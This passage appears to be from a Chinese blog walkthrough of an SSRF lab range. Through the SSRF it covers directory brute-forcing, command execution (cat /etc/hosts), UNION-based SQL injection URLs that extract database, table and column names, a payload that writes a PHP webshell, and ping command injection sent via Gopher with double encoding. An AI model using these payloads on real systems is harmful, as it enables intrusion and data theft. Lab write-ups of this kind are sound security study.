> 172.72.23.24 :80
>
> 172.72.23.25 : 80
>
> 172.72.23.26 : 8080
>
> 172.72.23.27 – 6379
>
> 172.72.23.28 – 6379
>
> 172.72.23.29 – 3306
和拓扑图一样，说明环境没问题~可以开始了
> 也可以采用BP的爆破插件Turbo Intruder;速度相当快但是准确度…不敢恭维
>
> 使用方法和常用脚本看[链接](http://shaoefan.cn/2021/06/02/burp-turbo-intruder-cha-jian/)
###  .22 学会内网目录爆破
通过SSRF爆破一下目录，这个时候可以试试上述的Trubo Intruder…看看上面链接就会
字典的话可用dirsearch的
6s就跑完了:joy:
发现这是被人日过的站了，直接代码执行
千万记得这个空格得二次编码…浏览器输入空格会变成+，自己改包手动变成空格再编码一次变成%20，同时得保证第一次解码后能被当做参数读取，所以再次编码
（不然哪有参数是cmd=cat /etc/hosts的，中间断开了是什么回事:laughing:)
命令执行成功！
###  .23 SQL注入
标准的基础SQL注入靶场=.=现在要通过ssrf去完成注入;空格要二次编码避免歧义
爆列数为4（直接带SSRF的网页输入，BP里写还得再一次编码…麻烦）
>
> [http://172.72.23.23:80/?id=1’%20order%20by%205–%20](http://172.72.23.23:80/?id=1'%20order%20by%205--%20)
爆信息（只有第3列不能回显，其他都行）
>
> [http://172.72.23.23:80/?id=-1’%20union%20select%20database(),user(),3,version()–%20](http://172.72.23.23:80/?id=-1'%20union%20select%20database\(\),user\(\),3,version\(\)--%20)
爆表名
>
> [http://172.72.23.23:80/?id=-1’%20union%20select%201,2,3,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())–%20](http://172.72.23.23:80/?id=-1'%20union%20select%201,2,3,\(select%20group_concat\(table_name\)%20from%20information_schema.tables%20where%20table_schema=database\(\)\)--%20)
爆字段
>
> [http://172.72.23.23:80/?id=-1’%20union%20select%201,2,3,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=’flag_is_here’)–%20](http://172.72.23.23:80/?id=-1'%20union%20select%201,2,3,\(select%20group_concat\(column_name\)%20from%20information_schema.columns%20where%20table_name='flag_is_here'\)--%20)
拿到Flag
当然也可以写Shell（靶场的主人给网站目录开了777权限，可以直接写马了）
>
> [http://172.72.23.23:80/?id=-1’%20union%20select%20null,null,null](http://172.72.23.23:80/?id=-1'%20union%20select%20null,null,null),’’%20into%20dumpfile%20’/var/www/html/shell.php’—%20
从SSRF那个页面远程命令执行即可
###  .24 命令执行
输入`http://172.72.23.24:80/`发现，是需要一个POST值的Web页面…这样就需要Gopher协议帮我们传递TCP数据流了
而且这个需要POST值的页面其实是一个经典靶场，就是一个简单的Linux ping命令
比如ping(‘参数为ip的POST传输’)，这个时候你的参数传入ip=127.0.0.1;dir就能执行dir命令了
补一下Linux知识吧:
多个命令可以放在一行上，其执行情况得依赖于用在命令之间的分隔符。
**如果每个命令被一个分号 (;) 所分隔，那么命令会连续的执行下去，如** ：
> printf “%s/n” “This is executed” ; printf “%s/n” “And so is this”  
>  This is executed/nAnd so is this/n
**如果每个命令被 && 号分隔，那么这些命令会一直执行下去，如果中间有错误的命令存在，则不再执行后面的命令，没错则执行到完为止**：
> date && printf “%s/n” “The date command was successful”  
>  2021年 09月 09日 星期四 17:54:04 CST  
>  The date command was successful  
>  所有命令成功执行完毕。
>
> date && suck && printf “%s/n” “The date command was successful”  
>  2021年 09月 09日 星期四 17:57:21 CST
>
> Command ‘suck’ not found, but can be installed with:
>
> sudo apt install suck
后面的成功执行提示语句不会被输出，因为 suck 命令无法识别。
**如果每个命令被双竖线(||)分隔符分隔，如果命令遇到可以成功执行的命令，那么命令停止执行，即使后面还有正确的命令则后面的所有命令都将得不到执行。假如命令一开始就执行失败，那么就会执行
|| 后的下一个命令，直到遇到有可以成功执行的命令为止，假如所有的都失败，则所有这些失败的命令都会被尝试执行一次** ：
> date || ls / || date ‘duck!’ || uname -a  
>  2021年 09月 09日 星期四 17:56:06 CST
第一个命令成功执行！后面的所有命令不再得到执行。
> date ‘duck!’ || dakkk || uname -a  
>  date: 无效的日期”duck!”  
>  dakkk：未找到命令  
>  Linux wzf-virtual-machine 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17
> 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
首先构造一下Gopher包，随便找一个POST修改即可
> 千万记得删除Accept-Encoding选项，否则ssrf回显的时候会被gzip编码导致乱码
成品如下
然后用之前我写的脚本二次编码（见Gopher章节）一下：
然后丢BP发送即可，这几个选项也是可以删的；Referer和Origin都是表示来源，Encoding必删影响回显
成品如下